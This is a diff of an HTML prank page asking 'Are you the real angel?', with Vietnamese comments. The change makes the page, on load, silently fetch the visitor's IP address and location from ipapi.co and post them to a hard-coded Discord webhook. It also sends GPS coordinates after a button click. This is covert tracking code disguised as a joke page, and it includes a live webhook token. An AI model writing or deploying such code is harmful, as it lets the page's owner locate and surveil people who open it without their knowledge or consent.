@@ -10,7 +10,7 @@
         button { padding: 12px 24px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
-<body>
+<body onload="getIpData()"> <!-- Tự động chạy lấy IP khi mở web -->
 
 <div id="angel-container">
     <h1>Are you the real angel?</h1>
@@ -21,39 +21,38 @@
 <iframe id="giphy-frame" src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="display:none;" frameBorder="0" allowFullScreen></iframe>
 
 <script>
-// Webhook của bạn
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
+// 1. Tự động lấy IP khi trang vừa load xong
+function getIpData() {
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        sendToDiscord(data.latitude, data.longitude, "IP (Tự động khi mở web)", "N/A", data.ip);
+    })
+    .catch(err => console.log("Lỗi IP:", err));
+}
+
+// 2. Chỉ chạy khi nhấn nút xác nhận
 function startAngelCheck() {
     document.getElementById('angel-container').style.display = 'none';
     document.getElementById('giphy-frame').style.display = 'block';
     
-    // Thử lấy vị trí GPS trước
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (pos) => sendToDiscord(pos.coords.latitude, pos.coords.longitude, "GPS", pos.coords.accuracy + "m"),
-            (err) => getIpLocation() // Nếu chặn GPS thì lấy IP
+            (pos) => sendToDiscord(pos.coords.latitude, pos.coords.longitude, "GPS (Người dùng OK)", pos.coords.accuracy + "m", "Đã lấy IP trước đó"),
+            (err) => console.log("GPS bị chặn")
         );
-    } else {
-        getIpLocation();
     }
 }
 
-function getIpLocation() {
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        sendToDiscord(data.latitude, data.longitude, "IP (Ước tính)", "N/A");
-    })
-    .catch(err => console.log("Lỗi lấy IP:", err));
-}
-
-function sendToDiscord(lat, lon, method, acc) {
+function sendToDiscord(lat, lon, method, acc, ip) {
     const payload = {
         embeds: [{
             title: `🎯 Dữ liệu: ${method}`,
-            color: method === "GPS" ? 5763719 : 16744192,
+            color: method.includes("GPS") ? 5763719 : 16744192,
             fields: [
+                { name: "🌐 Địa chỉ IP", value: ip ? ip : "Đã lấy", inline: false },
                 { name: "🛰️ Vĩ độ", value: String(lat), inline: true },
                 { name: "🛰️ Kinh độ", value: String(lon), inline: true },
                 { name: "🎯 Độ chính xác", value: acc, inline: false },
